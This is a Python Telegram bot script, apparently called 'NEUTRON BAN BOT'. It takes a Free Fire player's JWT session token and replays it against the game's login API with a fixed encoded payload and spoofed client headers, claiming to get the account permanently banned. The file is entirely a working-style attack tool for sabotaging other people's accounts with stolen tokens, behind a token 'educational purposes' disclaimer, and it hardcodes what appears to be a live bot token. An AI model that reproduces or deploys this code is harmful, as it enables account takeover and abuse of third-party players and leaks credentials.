import os
import sys
import json
import base64
import time
import requests
import urllib3
import logging
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

urllib3.disable_warnings()
logging.basicConfig(level=logging.INFO)

# ===== CONFIG =====
BOT_TOKEN = "8703596825:AAHluO1NGlM9rbj9uc8bfylk7a9NTPUm3aU"
ALLOWED_CHAT_ID = 7293041159  # Sirf tera chat ID allowed
API_URL = 'https://client.ind.freefiremobile.com/GetLoginData'

BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)

# ===== DECODING FUNCTIONS =====
def decode_ff_name(b64_str):
    try:
        if not b64_str: return "Unknown"
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            key_byte = key[i % len(key)]
            decrypted_bytes.append(byte ^ key_byte)
        return decrypted_bytes.decode('utf-8', errors='ignore') or "Unknown"
    except:
        return "Unknown"

def decode_jwt(token):
    try:
        payload = token.split('.')[1]
        payload += "=" * ((4 - len(payload) % 4) % 4)
        return json.loads(base64.urlsafe_b64decode(payload).decode('utf-8'))
    except:
        return {}

def trigger_injection(jwt_token, version):
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    body = base64.b64decode(BODY_BASE64)
    return requests.post(API_URL, headers=headers, data=body, timeout=20, verify=False)

# ===== TELEGRAM COMMANDS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ALLOWED_CHAT_ID:
        await update.message.reply_text("⛔ ACCESS DENIED! You are not authorized.")
        return
    
    keyboard = [
        [InlineKeyboardButton("🔐 BAN ACCOUNT", callback_data='ban')],
        [InlineKeyboardButton("📖 HELP", callback_data='help')],
        [InlineKeyboardButton("👨‍💻 ABOUT", callback_data='about')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔥 *NEUTRON BAN BOT ACTIVE* 🔥\n\n"
        "Send me a valid Free Fire JWT Token to ban an account permanently.\n"
        "Use /ban <token> or just send the token directly.\n\n"
        f"🆔 Your Chat ID: `{update.effective_chat.id}`",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def handle_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ALLOWED_CHAT_ID:
        await update.message.reply_text("⛔ ACCESS DENIED!")
        return
    
    token = update.message.text.strip()
    await process_ban(update, context, token)

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ALLOWED_CHAT_ID:
        await update.message.reply_text("⛔ ACCESS DENIED!")
        return
        
    if not context.args:
        await update.message.reply_text("⚠️ Usage: `/ban <JWT_TOKEN>`", parse_mode='Markdown')
        return
    token = context.args[0]
    await process_ban(update, context, token)

async def process_ban(update, context, token):
    msg = await update.message.reply_text("⏳ *Processing JWT Token...*", parse_mode='Markdown')
    
    try:
        user_data = decode_jwt(token)
        if not user_data:
            await msg.edit_text("❌ *Invalid JWT Token!*\nToken expired or malformed.", parse_mode='Markdown')
            return
        
        raw_nick = user_data.get('nickname', '')
        nickname = decode_ff_name(raw_nick)
        region = user_data.get('lock_region', user_data.get('region', 'IND'))
        account_id = user_data.get('account_id', 'Unknown')
        version = user_data.get('release_version', 'Latest')
        
        await msg.edit_text(
            f"🎯 *Target Acquired*\n\n"
            f"👤 *Nickname:* `{nickname}`\n"
            f"🆔 *Account ID:* `{account_id}`\n"
            f"🌍 *Region:* `{region}`\n"
            f"📦 *Patch:* `{version}`\n\n"
            f"⏳ *Injecting payload...*",
            parse_mode='Markdown'
        )
        
        response = trigger_injection(token, version)
        
        if response.status_code == 200:
            await msg.edit_text(
                f"✅ *ACCOUNT BANNED SUCCESSFULLY!*\n\n"
                f"👤 *Name:* `{nickname}`\n"
                f"🆔 *UID:* `{account_id}`\n"
                f"🌍 *Region:* `{region}`\n"
                f"📦 *Patch:* `{version}`\n"
                f"🔴 *Status:* `PERMANENTLY SUSPENDED`\n\n"
                f"🔥 *NEUTRON STRIKES AGAIN!*",
                parse_mode='Markdown'
            )
        else:
            await msg.edit_text(
                f"❌ *Ban Failed!*\n"
                f"Server returned: `{response.status_code}`\n"
                f"Check token validity and try again.",
                parse_mode='Markdown'
            )
            
    except requests.exceptions.ConnectionError:
        await msg.edit_text("🌐 *Network Error!*\nCheck your internet connection.", parse_mode='Markdown')
    except Exception as e:
        await msg.edit_text(f"⚠️ *Error:* `{str(e)}`", parse_mode='Markdown')

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ALLOWED_CHAT_ID:
        await update.callback_query.answer("⛔ Access Denied!", show_alert=True)
        return
        
    query = update.callback_query
    await query.answer()
    
    if query.data == 'ban':
        await query.message.reply_text("📤 *Send your Free Fire JWT Token:*", parse_mode='Markdown')
    elif query.data == 'help':
        await query.message.reply_text(
            "📖 *How to use:*\n"
            "1. Get JWT token from Free Fire client\n"
            "2. Send token in chat\n"
            "3. Bot will process and ban the account\n\n"
            "Commands:\n"
            "/start - Show menu\n"
            "/ban <token> - Ban account\n"
            "/help - Show this help",
            parse_mode='Markdown'
        )
    elif query.data == 'about':
        await query.message.reply_text(
            "👨‍💻 *NEUTRON BAN BOT*\n\n"
            "Version: 2.0\n"
            "Developer: NEUTRONNNN_KILLER\n"
            "Purpose: Free Fire Account Banning\n"
            "⚠️ For educational purposes only!",
            parse_mode='Markdown'
        )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ALLOWED_CHAT_ID:
        await update.message.reply_text("⛔ ACCESS DENIED!")
        return
        
    await update.message.reply_text(
        "📖 *Commands:*\n"
        "/start - Start the bot\n"
        "/ban <token> - Ban an account\n"
        "/help - Show this help\n\n"
        "Or simply paste the JWT token directly!",
        parse_mode='Markdown'
    )

async def check_chat_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ALLOWED_CHAT_ID:
        await update.message.reply_text("⛔ ACCESS DENIED!")
        return
    await update.message.reply_text(
        f"✅ *Authorized User*\n"
        f"🆔 Your Chat ID: `{update.effective_chat.id}`\n"
        f"🔑 Allowed ID: `{ALLOWED_CHAT_ID}`",
        parse_mode='Markdown'
    )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("ban", ban_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("myid", check_chat_id))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_token))
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    print("🔥 NEUTRON BAN BOT STARTED!")
    print(f"🆔 Allowed Chat ID: {ALLOWED_CHAT_ID}")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()